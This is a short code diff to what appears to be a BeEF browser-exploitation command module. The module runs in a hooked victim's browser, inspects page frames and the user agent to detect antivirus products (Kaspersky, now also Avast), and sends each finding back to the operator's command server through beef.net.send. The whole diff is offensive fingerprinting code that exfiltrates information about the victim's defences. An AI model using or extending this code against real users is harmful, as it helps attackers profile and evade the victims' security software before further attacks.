@@ -20,8 +20,11 @@ beef.execute(function() {
         ka = frm.contentDocument.getElementsByTagName("html")[0].outerHTML;
         var AV = document.getElementById("abs-top-frame");
         var NAV = document.getElementById("coFrameDiv");
+        var ASWregexp = new RegExp("ASW\/");
     //Detection of av elements ends
 
+	if (ASWregexp.test(navigator.userAgent))
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Avast');
     if (ka.indexOf("kasperskylab_antibanner") !== -1)
         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Kaspersky');
     else if (ka.indexOf("netdefender/hui/ndhui.js") !== -1)
